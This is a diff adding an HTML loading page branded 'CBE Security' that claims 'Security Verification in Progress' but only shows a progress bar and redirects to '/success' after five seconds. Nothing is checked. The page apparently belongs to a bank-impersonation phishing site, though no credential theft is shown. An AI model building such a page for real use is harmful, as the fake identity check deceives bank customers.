@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing - CBE Security</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/cbe-theme.css">
+    <link rel="stylesheet" href="css/animations.css">
+</head>
+<body>
+    <div class="loading-container">
+        <div class="cbe-loader">
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+            <div class="loader-ring"></div>
+        </div>
+        
+        <div class="loading-content">
+            <img src="assets/images/cbe-logo.png" alt="CBE Logo" class="cbe-logo">
+            <h2>Security Verification in Progress</h2>
+            <p class="loading-text">Please wait while we verify your identity...</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <p class="status-text" id="statusText">Initializing security check...</p>
+        </div>
+    </div>
+
+    <script src="js/animations.js"></script>
+    <script>
+        // Auto-redirect after loading
+        setTimeout(() => {
+            window.location.href = '/success';
+        }, 5000);
+    </script>
+</body>
+</html>
